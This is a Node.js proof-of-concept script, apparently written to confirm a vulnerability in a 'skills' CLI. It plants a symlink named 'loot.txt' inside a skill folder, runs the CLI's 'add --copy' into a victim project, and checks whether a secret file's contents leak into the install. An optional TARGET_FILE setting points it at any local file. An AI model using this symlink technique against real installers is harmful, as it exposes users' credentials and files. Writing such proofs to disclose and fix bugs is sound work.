import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import cp from 'node:child_process';
import { fileURLToPath } from 'node:url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

function resolveCliPath() {
  if (process.env.SKILLS_CLI_PATH) return process.env.SKILLS_CLI_PATH;
  return path.resolve(__dirname, '..', 'src', 'cli.ts');
}

function run() {
  const cliPath = resolveCliPath();
  if (!fs.existsSync(cliPath)) {
    throw new Error(`CLI not found at: ${cliPath}. Set SKILLS_CLI_PATH.`);
  }

  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'skills-poc-'));
  const src = path.join(root, 'malicious-skill');
  const proj = path.join(root, 'victim-project');

  fs.mkdirSync(src, { recursive: true });
  fs.mkdirSync(proj, { recursive: true });

  const skillMd = [
    '---',
    'name: exploit-skill',
    'description: poc',
    '---',
    '',
    '# exploit',
    '',
  ].join('\n');
  fs.writeFileSync(path.join(src, 'SKILL.md'), skillMd, 'utf8');

  let targetFile = process.env.TARGET_FILE;
  let secretValue;
  if (!targetFile) {
    targetFile = path.join(root, 'secret.txt');
    secretValue = 'VERY_SECRET_TOKEN=abc123';
    fs.writeFileSync(targetFile, `${secretValue}\n`, 'utf8');
  } else {
    if (!path.isAbsolute(targetFile)) {
      throw new Error('TARGET_FILE must be an absolute path.');
    }
    if (!fs.existsSync(targetFile)) {
      throw new Error(`TARGET_FILE does not exist: ${targetFile}`);
    }
    secretValue = fs.readFileSync(targetFile, 'utf8').trim();
  }

  const symlinkInSkill = path.join(src, 'loot.txt');
  fs.symlinkSync(targetFile, symlinkInSkill);

  const proc = cp.spawnSync(
    process.execPath,
    [cliPath, 'add', src, '--copy', '-y', '--agent', 'amp'],
    { cwd: proj, encoding: 'utf8' }
  );

  const installed = path.join(proj, '.agents', 'skills', 'exploit-skill', 'loot.txt');
  const exists = fs.existsSync(installed);
  const leaked = exists ? fs.readFileSync(installed, 'utf8').trim() : '<missing>';

  const result = {
    root,
    cliPath,
    targetFile,
    exitCode: proc.status,
    exists,
    leaked,
    expected: secretValue,
    vulnerabilityConfirmed: proc.status === 0 && exists && leaked === secretValue,
    installed,
    stdoutTail: (proc.stdout || '').slice(-1200),
    stderrTail: (proc.stderr || '').slice(-1200),
  };

  const outPath = path.join(__dirname, 'output.json');
  fs.writeFileSync(outPath, JSON.stringify(result, null, 2) + '\n', 'utf8');

  console.log(`Result written to: ${outPath}`);
  console.log(JSON.stringify(result, null, 2));
}

run();
